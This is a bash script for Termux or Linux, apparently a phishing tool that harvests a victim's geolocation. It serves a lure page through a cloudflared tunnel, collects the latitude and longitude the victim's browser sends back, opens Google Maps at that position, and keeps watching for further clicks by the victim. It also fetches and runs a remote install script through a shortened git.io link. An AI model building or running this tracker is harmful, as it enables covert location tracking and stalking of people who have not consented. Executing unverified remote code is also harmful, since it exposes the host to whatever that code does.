#!/usr/bin/env bash
#set -x
#<<<========Inbuilt Varialbles and values========>>>
CWD=$(pwd)
OS=$(uname -o)
if [[ ${OS,,} == *'android'* ]]; then
    if [[ ${CWD} == *'com.termux'* ]]; then
        export PREFIX='/data/data/com.termux/files/usr'
        INS() {
            apt install $1 -y
        }
        if ! hash termux-chroot >/dev/null 2>&1; then
            apt install proot -y >/dev/null 2>&1 | printf "\033[32mInstalling:: package: proot\033[00m\n"
        fi
    else
        printf "\033[32m[\033[31m!\033[32m] \033[34mYou are using unknown softarware! you may edit this script to run it on your software!\033[00m\n"
        exit 1
    fi
elif [[ ${OS,,} == *'linux'* ]]; then
    export PREFIX='/usr'
    INS() {
        sudo apt install $1 -y
    }
else
    printf "\033[32m[\033[31m!\033[32m] \033[34mYou are using unknown softarware! you may edit this script to run it on your software!\033[00m\n"
    exit 1
fi
#<<<========Color Code========>>>
S0="\033[1;30m" B0="\033[1;40m"
S1="\033[1;31m" B1="\033[1;41m"
S2="\033[1;32m" B2="\033[1;42m"
S3="\033[1;33m" B3="\033[1;43m"
S4="\033[1;34m" B4="\033[1;44m"
S5="\033[1;35m" B5="\033[1;45m"
S6="\033[1;36m" B6="\033[1;46m"
S7="\033[1;37m" B7="\033[1;47m"
R0="\033[0;00m"
#<<<=========Internet check=========>>>
ping -c 1 google.com >/dev/null 2>&1
if [ "$?" != '0' ]; then
    printf "${S2}[${S1}!${S2}] ${S4}Check your internet connection!!${R0}\n"
    exit 1
fi
#<<<=========Requrements=====>>>
pkgs=(git wget curl php jq)
for p in "${pkgs}"; do
    if ! hash ${p} >/dev/null 2>&1; then
        printf "${S4}Package${S1}: ${S2}${p} not found! ${S1}::${S2} Installing.....${R0}\n"
        INS "${p}" >/dev/null 2>&1
    fi
    if ! hash gpg > /dev/null 2>&1; then
        INS gnupg > /dev/null 2>&1
    fi
    if ! hash cloudflared >/dev/null 2>&1; then
        source <(curl -fsSL "https://git.io/JinSa")
        cd $CWD >/dev/null 2>&1
    fi
done
#<<<=========Program=========>>>
#lets tests for login page lol this program is in process not completed!! so dont use now
if [ ! -d $CWD/logs ]; then
    mkdir logs > /dev/null 2>&1
else
    rm -rf $CWD/logs/phpLogs.txt $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
    printf ''>$CWD/assets/send/php/result.txt
    printf ''>$CWD/assets/send/php/info.txt
fi
killall php cloudflared >/dev/null 2>&1
cd $CWD/assets/send >/dev/null 2>&1
php -S 127.0.0.1:4444 >> $CWD/logs/phpSend.txt 2>&1 &
sleep 4
if [[ ${OS,,} == *'android'* ]]; then
    termux-chroot cloudflared -url 127.0.0.1:4444 --logfile ${CWD}/logs/cloudflare-log.txt > /dev/null 2>&1 &
else
    cloudflared -url 127.0.0.1:4444 --logfile ${CWD}/logs/cloudflare-log.txt > /dev/null 2>&1 &
fi
sleep 7
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${CWD}/logs/cloudflare-log.txt")
#<<<===listner====>>>#
cd $CWD/assets >/dev/null 2>&1
#replace link in output html
while read -r X; do
    echo ${X//€BHUTUULINK/$link}
done < $CWD/assets/serverDummy > $CWD/assets/server.html
#start web login
php -S 127.0.0.1:8084 >> $CWD/logs/phpLogin.txt 2>&1 &
printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://127.0.0.1:8084 ${R0}\n"
xdg-open http://127.0.0.1:8084
#<<<---Get location--->>>#
while true; do
    if [ -z $(cat $CWD/assets/send/php/result.txt) ]; then
        sleep 0.3
    else
        latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
        longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
        break
    fi
done
xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
printf "${S6}Variation if victim clicked again:-${R0}\n\n"
tail -f $CWD/assets/send/php/result.txt